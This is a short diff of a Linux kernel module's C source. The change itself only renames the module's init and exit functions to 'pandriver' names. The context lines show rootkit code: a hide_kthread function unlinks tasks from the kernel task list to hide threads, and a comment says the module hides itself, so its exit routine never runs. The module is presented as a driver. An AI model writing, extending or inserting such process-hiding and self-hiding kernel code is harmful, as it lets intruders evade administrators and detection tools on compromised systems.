@@ -322,7 +322,7 @@ static void hide_kthread(struct task_struct *task)
 	list_del_init(&task->tasks);
 }
 
-static int __init driver_init(void)
+static int __init pandriver_init(void)
 {
 	struct task_struct *chf;
 	struct task_struct *dhf;
@@ -359,13 +359,13 @@ static int __init driver_init(void)
 	return 0;
 }
 
-static void __exit driver_exit(void)
+static void __exit pandriver_exit(void)
 {
 	// 模块已隐藏，此函数不会被调用
 }
 
-module_init(driver_init);
-module_exit(driver_exit);
+module_init(pandriver_init);
+module_exit(pandriver_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("盼盼食品");
